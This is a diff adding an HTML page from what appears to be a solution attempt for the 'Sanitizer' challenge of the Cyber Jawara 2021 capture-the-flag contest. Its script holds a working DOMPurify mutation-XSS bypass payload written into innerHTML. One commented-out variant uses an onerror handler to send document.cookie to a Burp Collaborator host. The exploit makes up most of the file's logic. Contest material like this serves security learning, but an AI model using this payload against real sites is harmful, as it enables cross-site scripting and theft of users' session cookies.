@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+  <head>
+	<meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<link rel="stylesheet" href="/pico.min.css" />
+	<script type="text/javascript" src="/purify.min.js"></script>
+	<title>Sanitizer</title>
+  </head>
+  <body>
+	<main class="container">
+	  <hgroup>
+		<h1>Sanitizer</h1>
+		<h2>Jangan lupa pakai masker dan cuci tangan ya!</h2>
+	  </hgroup>
+	  <article>
+		<center>
+		  <h3>Sertifikat Sanitasi Cyber Jawara 2021</h3>
+		  <p>Sertifikat ini diberikan kepada:</p>
+		  <u id="nama">________________________________</u><br />
+		  <u id="nama2">________________________________</u><br />
+		  <small>ID: <b id="uuid"></b></small><br />
+		  <small>pada tanggal 30 Oktober 2021</small><br /><br />
+		  <p>telah menyelesaikan soal Sanitizer pada CJ2021</p>
+		</center>
+	  </article>
+	</main>
+  </body>
+  <script type="text/javascript">
+	// unrelated just for nice touch
+	function generateUUID() {
+	  // Public Domain/MIT
+	  var d = new Date().getTime(); //Timestamp
+	  var d2 =
+		(typeof performance !== "undefined" &&
+		  performance.now &&
+		  performance.now() * 1000) ||
+		0; //Time in microseconds since page-load or 0 if unsupported
+	  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
+		/[xy]/g,
+		function (c) {
+		  var r = Math.random() * 16; //random number between 0 and 16
+		  if (d > 0) {
+			//Use timestamp until depleted
+			r = (d + r) % 16 | 0;
+			d = Math.floor(d / 16);
+		  } else {
+			//Use microseconds since page-load if supported
+			r = (d2 + r) % 16 | 0;
+			d2 = Math.floor(d2 / 16);
+		  }
+		  return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
+		}
+	  );
+	}
+
+	function sanitizer(dirty) {
+	  return DOMPurify.sanitize(dirty, {
+		FORBID_TAGS: ["style"],
+	  });
+	}
+
+	window.onload = function () {
+	  var vaccineCardId = document.querySelector("#uuid");
+	  vaccineCardId.innerText = generateUUID();
+	  window.location.hash = 1;
+	
+	  if (window.location.hash) {
+		var nama = window.location.hash.slice(1);
+		var vaccineCardName = document.querySelector("#nama");
+		// var query = '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=location=location.pathname+/0ab4oav8vfregn54c7b0gymullrgf5.burpcollaborator.net/+document.cookie src>">';
+		var query = '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=a onerror=alert(1)>">';
+		// console.log(atob(nama));
+		nama = btoa(query)
+		console.log(nama)
+		vaccineCardName.innerHTML = sanitizer(atob(nama));
+	  
+		// var vaccineCardName = document.querySelector("#nama2");
+		
+		// nama = btoa(query)
+		// vaccineCardName.innerHTML = atob(nama);
+
+		}
+	};
+
+  </script>
+</html>
+
+
+	
